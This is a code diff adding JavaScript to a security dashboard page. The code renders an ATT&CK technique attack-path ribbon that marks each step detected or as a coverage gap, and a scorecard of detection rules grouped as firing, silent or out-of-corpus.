+    function isDepth(s) { return /^gap-chase\b/.test(String(s.why || "")); }
+    function isSeed(s) { return /^seed\b/.test(String(s.why || "")); }
+    function vClass(s) { return s.detected ? "det" : (s.gap_type === "rule" ? "gap-rule" : "gap-base"); }
+    function vPill(s) {
+      return s.detected ? '<span class="pill det">● detected</span>'
+        : (s.gap_type === "rule" ? '<span class="pill rule">● gap · rule</span>'
+          : '<span class="pill base">● gap · base-rate</span>');
+    }
+
+    // ids the evidence drawer can open in the current coverage view
+    var live = Object.create(null);
+    try { ((DATA && DATA[view] && DATA[view].techniques) || []).forEach(function (t) { live[t.id] = 1; }); }
+    catch (e) {}
+
+    // ---- derive the whole structure from the data (nothing hard-coded) ----
+    var colIndex = Object.create(null), cols = [];
+    steps.forEach(function (s) {
+      (s.tactics || []).forEach(function (t) {
+        if (!(t in colIndex)) { colIndex[t] = cols.length; cols.push({ name: t, ix: cols.length, primary: [], touch: [], xref: null }); }
+      });
+    });
+    var opener = Object.create(null), gapOpener = Object.create(null);
+    steps.forEach(function (s) {
+      (s.tactics || []).forEach(function (t) {
+        if (opener[t] == null) opener[t] = s.step;
+        if (!s.detected && gapOpener[t] == null) gapOpener[t] = s.step;
+      });
+    });
+    steps.forEach(function (s) {
+      var tac = s.tactics || []; if (!tac.length) return;
+      cols[colIndex[tac[0]]].primary.push(s);
+      tac.forEach(function (t) { cols[colIndex[t]].touch.push(s); });
+    });
+    cols.forEach(function (c) {
+      var hasRule = c.touch.some(function (s) { return !s.detected && s.gap_type === "rule"; });
+      var hasBase = c.touch.some(function (s) { return !s.detected && s.gap_type !== "rule"; });
+      c.verdict = hasRule ? "gap-rule" : (hasBase ? "gap-base" : "det");
+      if (!c.primary.length && c.touch.length) c.xref = c.touch[0];
+    });
+
+    var bMin = Infinity, bMax = -Infinity, dMin = Infinity, dMax = -Infinity;
+    steps.forEach(function (s) {
+      if (isDepth(s)) { dMin = Math.min(dMin, s.step); dMax = Math.max(dMax, s.step); }
+      else { bMin = Math.min(bMin, s.step); bMax = Math.max(bMax, s.step); }
+    });
+
+    var sm = ap.summary || {}, stop = ap.stop || {};
+
+    var sf = document.getElementById("ap-standfirst");
+    if (sf) sf.innerHTML =
+      'planner <b>' + esc(ap.planner || "—") + '</b>' +
+      '<span class="d">/</span>stop <b>' + esc(stop.reason || "—") + '</b> @ ' + esc(stop.steps_taken != null ? stop.steps_taken : sm.steps) +
+      '<span class="d">/</span><b>' + esc(sm.tactics_covered != null ? sm.tactics_covered : cols.length) + ' of 11</b> tactics walked' +
+      '<span class="d">/</span>order only — <b>every verdict is the engine&rsquo;s</b>';
+
+    var stats = document.getElementById("ap-stats");
+    function stat(n, l, tone, tot) {
+      return '<div class="ap-stat"><div class="n ' + tone + '">' + esc(n) +
+        (tot ? '<span class="tot">' + esc(tot) + '</span>' : '') + '</div><div class="l">' + esc(l) + '</div></div>';
+    }
+    if (stats) stats.innerHTML =
+      stat(sm.steps != null ? sm.steps : steps.length, "techniques chained", "i") +
+      stat(sm.detected, "caught by the engine", "g") +
+      stat(sm.gaps, "red gaps surfaced", "r") +
+      stat(sm.tactics_covered, "ATT&CK tactics covered", "i", "/11");
+
+    var phases = document.getElementById("ap-phases");
+    if (phases) {
+      // Only emit a phase pill when its step range is finite - a path with no gap-chase steps
+      // (everything detected) has no depth phase, so we omit it rather than print Infinity.
+      var ph = "";
+      if (bMax >= bMin) ph += '<span class="ap-ph b"><i></i>breadth · <b>' + pad(bMin) + "–" + pad(bMax) + "</b> · sweep new ground</span>";
+      if (dMax >= dMin) ph += '<span class="ap-ph d"><i></i>depth · <b>' + pad(dMin) + "–" + pad(dMax) + "</b> · turn back &amp; chase the gaps</span>";
+      phases.innerHTML = ph;
+    }
+
+    var route = document.getElementById("ap-route");
+    if (route) route.innerHTML =
+      '<span class="rl">route</span>' +
+      cols.map(function (c, i) {
+        return (i ? '<span class="ar">→</span>' : '') +
+          '<span class="rt' + (c.verdict === "gap-rule" ? ' gap' : '') + '">' + esc(c.name) + '</span>';
+      }).join("");
+
+    function beadHTML(s, pos) {
+      var depth = isDepth(s);
+      var tagCls = depth ? "depth" : "";
+      var tagLbl = depth ? "gap-chase" : (isSeed(s) ? "seed" : "breadth");
+      var chase = "";
+      if (depth) {
+        var t = (s.tactics || [])[0] || "", op = gapOpener[t];
+        chase = '<span class="b-chase">chasing ' + esc(t) +
+          (op != null ? ' · gap opened at step ' + esc(pad(op)) : '') + '</span>';
+      }
+      var extra = (s.tactics || []).slice(1).filter(function (t) { return opener[t] === s.step; });
+      var bridge = extra.length ? '<span class="b-bridge">+ ' + esc(extra.join(" · ")) + '</span>' : "";
+      var clickable = !!live[s.id];
+      var tag = clickable ? "button" : "div";
+      var aria = ((s.tactics && s.tactics[0]) ? s.tactics[0] + " — " : "") + "step " + pad(s.step) + ", " + s.id + ", " +
+        (s.detected ? "detected" : (s.gap_type === "rule" ? "gap rule" : "gap base-rate")) + (clickable ? ". Open evidence." : "");
+      // No role override: a clickable bead stays a native <button>; a static one is a generic
+      // container. (Beads are nested in .rib-col, so a list/listitem relationship never held.)
+      return '<' + tag + ' class="bead ' + vClass(s) + ' ' + pos + (depth ? ' chase' : '') + '"' +
+        (clickable ? ' type="button" data-ap-id="' + esc(s.id) + '"' : ' role="group"') +
+        ' style="--i:' + (s.step - 1) + '" aria-label="' + esc(aria) + '">' +
+        '<span class="b-top"><span class="b-no">' + esc(pad(s.step)) + '</span>' +
+          '<span class="b-id">' + esc(s.id) + '</span></span>' +
+        '<span class="b-nm">' + shortName(s.name) + '</span>' + bridge +
+        '<span class="b-v">' + vPill(s) + '</span>' +
+        '<span class="b-tag"><span class="ktag ' + tagCls + '">' + esc(tagLbl) + '</span></span>' +
+        chase +
+      '</' + tag + '>';
+    }
+
+    ribbon.innerHTML =
+      '<div class="rib-line" aria-hidden="true"></div>' +
+      cols.map(function (c) {
+        var headCls = c.verdict === "gap-rule" ? " gap" : (c.verdict === "gap-base" ? " base" : "");
+        var body = "";
+        if (c.primary.length) {
+          body = c.primary.map(function (s, i) { return beadHTML(s, i === 0 ? "first" : "stacked"); }).join("");
+        } else if (c.xref) {
+          var s = c.xref, clickable = !!live[s.id], tag = clickable ? "button" : "div";
+          body = '<' + tag + ' class="rib-xref first"' +
+            (clickable ? ' type="button" data-ap-id="' + esc(s.id) + '"' : '') +
+            ' aria-label="' + esc(c.name + " opened via step " + pad(s.step) + " " + s.id) + '">' +
+            '↳ opened via step ' + esc(pad(s.step)) + '</' + tag + '>';
+        }
+        return '<div class="rib-col ' + c.verdict + '">' +
+          '<div class="rib-head' + headCls + '"><span class="ix">' + pad(c.ix + 1) + '</span>' +
+            '<span class="tac">' + esc(c.name) + '</span></div>' +
+          '<div class="rib-node"><span class="nd" aria-hidden="true"></span></div>' +
+          body +
+        '</div>';
+      }).join("");
+
+    ribbon.addEventListener("click", function (e) {
+      var el = e.target.closest ? e.target.closest("[data-ap-id]") : null;
+      if (el && typeof openDetail === "function") openDetail(el.getAttribute("data-ap-id"));
+    });
+  }
+
+  // ---- Rule health (redgap audit): firing / SILENT / out-of-corpus, from a committed sample ----
+  function renderScorecard() {
+    var host = document.getElementById("rh-rules");
+    if (!host) return;
+    var sc;
+    try { sc = JSON.parse(document.getElementById("scorecard-data").textContent || "{}"); }
+    catch (e) { return; }
+    var rules = Array.isArray(sc.rules) ? sc.rules : [];
+    if (!rules.length) return;
+    var s = sc.summary || {};
+    var buckets = document.getElementById("rh-buckets");
+    if (buckets) buckets.innerHTML =
+      '<div class="rh-b firing"><div class="n">' + esc(s.firing) + '</div><div class="k">firing</div></div>' +
+      '<div class="rh-b silent"><div class="n">' + esc(s.silent) + '</div><div class="k">SILENT</div></div>' +
+      '<div class="rh-b ooc"><div class="n">' + esc(s.out_of_corpus) + '</div><div class="k">out&#8209;of&#8209;corpus</div></div>';
+
+    function why(r) {
+      if (r.status === "firing") {
+        return "fired on real telemetry for " + esc((r.fired_on || []).join(", ") || "-");
+      }
+      if (r.status === "out_of_corpus") {
+        return "tagged to " + esc((r.technique_ids || []).join(", ") || "no ATT&CK technique") +
+          " - no RedGap telemetry to exercise it";
+      }
+      var present = (r.silent_detail || []).filter(function (d) { return d.telemetry_present; }).map(function (d) { return d.technique_id; });
+      var absent = (r.silent_detail || []).filter(function (d) { return !d.telemetry_present; }).map(function (d) { return d.technique_id; });
+      if (present.length) {
+        return "valid + tagged to " + esc(present.join(", ")) +
+          ', telemetry present, yet <span class="mono">never fired</span> &mdash; false confidence';
+      }
+      return "tagged to " + esc(absent.join(", ")) +
+        " but that produced no telemetry to fire on (untested)";
+    }
+    var order = { firing: 0, silent: 1, out_of_corpus: 2 };
+    host.innerHTML = rules.slice().sort(function (a, b) {
+      return (order[a.status] == null ? 9 : order[a.status]) - (order[b.status] == null ? 9 : order[b.status]);
+    }).map(function (r) {
+      var cls = r.status === "out_of_corpus" ? "ooc" : r.status;
+      var label = r.status === "out_of_corpus" ? "out-of-corpus" : r.status;
+      return '<div class="rh-rule ' + cls + '">' +
+        '<span class="rh-badge ' + cls + '">' + esc(label) + "</span>" +
+        '<span class="rt">' + esc(r.title || r.id) + "</span>" +
+        '<span class="rwhy">' + why(r) + "</span></div>";
+    }).join("");
+  }
+
   render();
+  renderAttackPath();
+  renderScorecard();
 </script>
 </body>
 </html>
